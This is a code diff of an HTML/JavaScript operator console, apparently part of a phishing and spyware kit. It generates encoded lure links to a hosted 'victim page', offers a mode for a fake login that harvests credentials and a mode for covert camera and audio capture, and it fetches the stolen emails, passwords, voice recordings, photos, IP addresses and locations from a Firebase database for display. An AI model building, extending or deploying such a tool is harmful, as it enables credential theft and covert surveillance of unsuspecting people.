@@ -3,101 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LEGEND V17 | ULTRA</title>
+    <title>LEGEND CONSOLE V18</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
-        body { background: #f0f2f5; font-family: 'Poppins', sans-serif; margin: 0; padding: 10px; }
-        .container { max-width: 500px; margin: auto; }
-        .card { background: white; padding: 20px; border-radius: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); margin-bottom: 15px; }
-        h1 { color: #cc0000; font-size: 1.1rem; text-align: center; margin: 0 0 15px; }
-        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 12px; margin-bottom: 10px; box-sizing: border-box; outline: none; }
-        .btn { width: 100%; padding: 12px; border: none; border-radius: 12px; background: #00a884; color: white; font-weight: bold; cursor: pointer; margin-bottom: 8px; font-size: 14px; }
-        .btn-del { background: #ff3e3e; margin-top: 10px; padding: 5px; font-size: 12px; }
-        .log-card { background: white; padding: 15px; border-radius: 15px; margin-top: 10px; border-left: 5px solid #cc0000; font-size: 0.8rem; position: relative; }
-        .snap-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 5px; margin-top: 10px; }
-        .snap-img { width: 100%; border-radius: 8px; border: 1px solid #ddd; }
-        .badge { background: #f8f9fa; border: 1px solid #eee; padding: 3px 7px; border-radius: 5px; display: inline-block; margin: 2px; }
-        .copy-box { background: #e8f5f2; padding: 10px; border-radius: 10px; font-size: 0.7rem; word-break: break-all; margin-top: 10px; display: none; cursor: pointer; border: 1px dashed #00a884; }
+        body { background: #f0f2f5; font-family: sans-serif; padding: 15px; margin: 0; }
+        .card { background: white; padding: 20px; border-radius: 15px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); margin-bottom: 10px; }
+        .btn { width: 100%; padding: 12px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-bottom: 5px; color: white; }
+        .log-card { background: #fff; padding: 15px; border-radius: 10px; margin-top: 10px; border-left: 5px solid #f00; font-size: 0.8rem; }
+        audio { width: 100%; margin-top: 10px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="card">
-            <h1>LEGEND ULTRA V17</h1>
-            <input type="text" id="masterKey" placeholder="Secret Key">
-            <input type="text" id="targetUrl" placeholder="Target Link (YouTube)">
-            <button class="btn" onclick="generateLink()">GENERATE & COPY LINK</button>
-            <div id="copyArea" class="copy-box" onclick="copyLink()"></div>
-        </div>
-
-        <div style="display: flex; gap: 5px;">
-            <button class="btn" style="background:#333;" onclick="fetchLogs('tracking')">LOGS</button>
-            <button class="btn" style="background:#cc0000;" onclick="fetchLogs('photos')">SNAPS</button>
-            <button class="btn" style="background: #007bff;" onclick="deleteData()">DELETE ALL</button>
-        </div>
-
-        <div id="displayArea"></div>
+    <div class="card">
+        <h2 style="color:#f00; text-align:center;">LEGEND V18 CONSOLE</h2>
+        <input type="text" id="masterKey" placeholder="Secret Key" style="width:100%; padding:10px; margin-bottom:10px; border-radius:5px; border:1px solid #ddd;">
+        <input type="text" id="targetUrl" placeholder="Target Link" style="width:100%; padding:10px; margin-bottom:10px; border-radius:5px; border:1px solid #ddd;">
+        
+        <select id="mode" style="width:100%; padding:10px; margin-bottom:10px;">
+            <option value="1">Mode 1: Fake Login (Phishing)</option>
+            <option value="2">Mode 2: Spy (Cam + Audio)</option>
+        </select>
+        
+        <button class="btn" style="background:#00a884;" onclick="generateLink()">GENERATE MASTER LINK</button>
+        <p id="resLink" style="word-break:break-all; font-size:0.7rem; color:blue;"></p>
     </div>
+
+    <div style="display:grid; grid-template-columns: 1fr 1fr; gap:5px;">
+        <button class="btn" style="background:#333;" onclick="fetchData('logins')">LOGINS</button>
+        <button class="btn" style="background:#cc0000;" onclick="fetchData('audio')">VOICES</button>
+    </div>
+
+    <div id="displayArea"></div>
 
     <script>
         const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";
-        const VICTIM_PAGE = "https://video-obtg.vercel.app/"; 
+        const VICTIM_PAGE = "https://video-obtg.vercel.app/";
 
-        async function generateLink() {
+        function generateLink() {
             const k = document.getElementById('masterKey').value;
             const r = document.getElementById('targetUrl').value;
-            if(!k || !r) return alert("Details bhariye!");
-            const long = `${VICTIM_PAGE}?id=${btoa(JSON.stringify({k, r}))}`;
-            try {
-                const res = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(long)}`);
-                const short = await res.text();
-                const box = document.getElementById('copyArea');
-                box.innerText = short;
-                box.style.display = 'block';
-                copyLink();
-            } catch(e) { alert("Link created, click below to copy!"); }
+            const m = document.getElementById('mode').value;
+            const link = `${VICTIM_PAGE}?id=${btoa(JSON.stringify({k, r, m}))}`;
+            document.getElementById('resLink').innerText = link;
         }
 
-        function copyLink() {
-            const text = document.getElementById('copyArea').innerText;
-            navigator.clipboard.writeText(text);
-            alert("Link Copied to Clipboard!");
-        }
-
-        async function fetchLogs(path) {
+        async function fetchData(path) {
             const key = document.getElementById('masterKey').value;
             const res = await fetch(`${DB_URL}${path}/${key}.json`);
             const data = await res.json();
             const area = document.getElementById('displayArea');
             area.innerHTML = "";
-            if(!data) return area.innerHTML = "<p style='text-align:center;'>Empty.</p>";
+            if(!data) return;
 
             Object.keys(data).reverse().forEach(id => {
                 const item = data[id];
-                if(path === 'photos') {
-                    area.innerHTML += `<div class="log-card"><b>🕒 ${item.time}</b><img src="${item.photo}" class="snap-img"></div>`;
+                if(path === 'logins') {
+                    area.innerHTML += `<div class="log-card">🕒 ${item.time}<br>👤 <b>Email:</b> ${item.email}<br>🔑 <b>Pass:</b> ${item.pass}</div>`;
                 } else {
-                    area.innerHTML += `<div class="log-card">
-                        <b>🕒 ${item.time}</b><br>
-                        <span class="badge">🌐 IP: ${item.ip}</span> <img src="${item.flag}" width="18"><br>
-                        <span class="badge">📍 ${item.loc}</span><br>
-                        <span class="badge">📱 ${item.model}</span> <span class="badge">🔋 ${item.bat}</span><br>
-                        <a href="${item.map}" target="_blank" style="color:red; font-weight:bold;">[ OPEN GOOGLE MAPS ]</a>
-                    </div>`;
+                    area.innerHTML += `<div class="log-card">🕒 ${item.time}<br><audio controls src="${item.audio}"></audio></div>`;
                 }
             });
-        }
-
-        async function deleteData() {
-            const key = document.getElementById('masterKey').value;
-            if(!key) return alert("Pehle Secret Key likhein!");
-            if(confirm("Sara data delete kar dein?")) {
-                await fetch(`${DB_URL}tracking/${key}.json`, { method: 'DELETE' });
-                await fetch(`${DB_URL}photos/${key}.json`, { method: 'DELETE' });
-                await fetch(`${DB_URL}clipboard/${key}.json`, { method: 'DELETE' });
-                alert("Data Cleaned!");
-                document.getElementById('displayArea').innerHTML = "";
-            }
         }
     </script>
 </body>
